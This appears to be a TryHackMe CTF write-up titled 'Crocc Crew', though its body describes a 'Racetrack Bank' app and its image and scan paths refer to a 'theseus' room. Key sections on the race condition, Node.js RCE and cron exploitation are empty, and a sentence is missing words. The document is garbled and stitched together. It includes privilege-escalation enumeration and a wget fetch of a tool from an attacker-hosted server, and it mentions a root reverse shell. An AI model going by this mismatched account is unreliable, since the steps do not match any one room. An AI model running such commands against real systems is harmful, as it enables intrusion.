---
title: "Crocc Crew - TryHackMe"
date: 2026-09-10 10:20:30 +0545

description: ""

categories: [Web, Linux ]
tags: [web, linux, nmap, burpsuite, race-condition, nodejs, RCE, cronjob]

image:
  path: /assets/img/posts_thumbnails/crocc_crew.png
  alt: "Crocc Crew"

level: Hard
platform: TryHackMe
series: "Web Exploitation"  
  
room: "Crocc Crew "
type: "CTF Write-up"
status: complete 
---

## Overview

This is a detailed walkthrough of how I rooted the **Crocc Crew** room on TryHackMe and captured both  and flags.

---

## Reconnaissance

I started with a full TCP port scan combined with default scripts and service-version detection.

```bash
nmap -sC -sV -sS -p- -T4 -oN /home/kali/Desktop/THM_LAB/rooms/hard/theseus/scan.txt <target-ip>
```
The open ports are:

22/tcp   SSH
80/tcp   HTTP

![Nmap](/assets/images/writeups/theseus/1.png)

The presence of HTTP immediately made the web application the primary attack surface, while SSH could potentially become useful later if valid credentials were discovered.

---

## Web App Enumeration

Navigating to port 80 revealed the Racetrack Bank web application.



---

## Initial Foothold — Discovering the Race Condition

At this point, I started to use different tools and techniques to figure out where I could gain an initial foothold. This was perhaps the hardest part of this challenge and took me a while to figure out.



---

## Premium Features → Node.js RCE

With enough gold, I purchased the premium account and gained access to the previously restricted Premium Features page

---

## Privilege Escalation

With the user shell established, I moved on to Linux privilege escalation. As usual, I started with common privilege-escalation checks.

### SUID Enumeration

I searched for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```
![suid_binary](/assets/images/writeups/theseus/8.png)

There was an interesting SUID binary, but after investigating its behaviour, it did not provide a practical path to root.

### Linux Capabilities

I also checked for binaries with Linux capabilities:

```bash
getcap -r / 2>/dev/null
```
![capabilities](/assets/images/writeups/theseus/9.png)

Although capabilities can sometimes provide an easy privilege-escalation path, the results here did not immediately lead to root. This was a good reminder not to focus exclusively on SUID binaries and capabilities. So i continued with broader system enumeration.

### Discovering the Root Cron Job

While looking for processes that were being executed periodically, I used `pspy64` to monitor processes without requiring root privileges. I transferred pspy64 to the target.

```bash
python3 -m http.server 80
wget http://<attacker-ip>/pspy64
chmod +x pspy64
```
![pspy64](/assets/images/writeups/theseus/10.png)

Running pspy64 revealed a recurring cleanup process. This was particularly interesting because it showed a script being executed automatically by a privileged process.

### Cron Job Exploitation

Further investigation revealed a cleanup script `/home/brian/cleanup/cleanupscript.sh`



I then waited for the cron job to execute. A connection was received on my listener, this time with root privileges. Finally, with a root shell, I was able to access the root flag.

![flag](/assets/images/writeups/theseus/13.png)

---

🖼️ **All process screenshot** ![all_process_screenshort](/assets/images/writeups/theseus/all_process.png)

---


*Thanks for reading!*
